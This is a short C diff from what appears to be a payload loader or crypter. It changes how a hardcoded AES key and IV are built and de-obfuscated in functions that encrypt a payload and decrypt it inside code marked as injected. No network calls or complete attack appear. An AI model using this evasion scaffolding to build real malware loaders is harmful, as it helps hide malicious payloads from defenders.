@@ -16,10 +16,8 @@ static inline LONG EncryptPayload(IN OUT PBYTE pPayload, IN CONST SIZE_T szPaylo
         return ERROR_INCORRECT_SIZE;
     }
 
-    // CONST AES_KEY key = {.b = "sUp3rDuP3rS3cr3T"};
-    // CONST AES_IV iv = {.b = "r4Nd0MiVR4nD0mIv"};
-    CONST PCAES_KEY pKey = (PCAES_KEY)(PCBYTE)ByteString("sUp3rDuP3rS3cr3T");
-    CONST PCAES_IV pIv = (PCAES_IV)(PCBYTE)ByteString("r4Nd0MiVR4nD0mIv");
+    CONST PCAES_KEY pKey = (PCAES_KEY)BYTE_STRING("sUp3rDuP3rS3cr3T");
+    CONST PCAES_IV pIv = (PCAES_IV)BYTE_STRING("r4Nd0MiVR4nD0mIv");
 
     AES_SBOX sbox;
     AES_GenerateSbox(&sbox);
@@ -40,7 +38,7 @@ INJECTED_CODE static inline VOID DecryptPayload(IN OUT PBYTE pPayload,
     AES_GenerateSboxAndInv(&sbox, &sboxInv);
 
     AES_CTX ctx;
-    AES_InitCtx(&ctx, (PCAES_KEY)&DEOBF(key).data, (PCAES_IV)&DEOBF(iv).data, &sbox, &sboxInv);
+    AES_InitCtx(&ctx, (PCAES_KEY)DEOBF_BYTES(key), (PCAES_IV)DEOBF_BYTES(iv), &sbox, &sboxInv);
     AES_Decrypt(&ctx, pPayload, szPayloadSize);
 }
 
